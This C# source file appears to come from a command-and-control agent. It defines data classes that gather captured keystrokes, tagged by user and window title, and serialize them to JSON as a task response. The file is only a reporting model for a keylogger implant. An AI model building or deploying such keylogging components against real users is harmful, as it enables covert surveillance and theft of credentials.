using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace Agent.Models
{
    public class KeyPressTaskResponse : TaskResponse
    {
        public List<Keylogs> keylogs { get; set; }

        public void Prepare()
        {
            foreach(var keylog in keylogs)
            {
                keylog.keystrokes = keylog.builder.ToString();
            }
        }
        public string ToJson()
        {
            return JsonSerializer.Serialize(this, KeystrokesResponseJsonContext.Default.KeyPressTaskResponse);
        }
    }
    public class Keylogs
    {
        public string user { get; set; }
        public string window_title { get; set; }
        public string keystrokes { get; set; }
        [JsonIgnore]
        public StringBuilder builder { get; set; }
    }
    [JsonSerializable(typeof(KeyPressTaskResponse))]
    [JsonSerializable(typeof(string))]
    [JsonSerializable(typeof(Keylogs))]
    public partial class KeystrokesResponseJsonContext : JsonSerializerContext
    {
    }
}
